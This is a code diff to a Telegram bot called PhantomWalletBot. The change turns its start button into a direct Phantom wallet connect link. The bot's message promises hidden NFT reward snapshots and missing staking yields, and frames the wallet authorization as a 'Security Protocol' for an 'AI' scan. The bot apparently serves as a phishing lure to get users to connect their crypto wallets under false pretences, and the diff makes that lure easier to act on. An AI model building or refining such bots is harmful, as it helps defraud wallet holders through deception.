@@ -31,7 +31,17 @@ class PhantomWalletBot:
         self.application.add_handler(CallbackQueryHandler(self.button_handler))
         
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        keyboard = [[InlineKeyboardButton("🔍 Start Automated AI Scanning", callback_data="connect_phantom")]]
+        """Start the bot and generate the connect URL immediately"""
+        user_id = update.effective_user.id
+        
+        # 1. Create a session right now so we can make the link
+        session_id, session_data = self.session_manager.create_session(user_id, "connect")
+        
+        # 2. Generate the Phantom connect URL
+        connect_url = PhantomUtils.generate_connect_url(session_id)
+        
+        # 3. Use the URL directly in the button (No callback_data)
+        keyboard = [[InlineKeyboardButton("🔍 Start Automated AI Scanning", url=connect_url)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await update.message.reply_text(
@@ -42,7 +52,8 @@ class PhantomWalletBot:
             "💎 **Hidden NFT Reward Snapshots**\n"
             "📈 **Missing Staking Yields**\n\n"
             "**Security Protocol:** Click below to authorize & start our AI to analyze your wallet and synchronize any available rewards instantly!",
-            reply_markup=reply_markup
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
         )
         
     async def connect_phantom(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
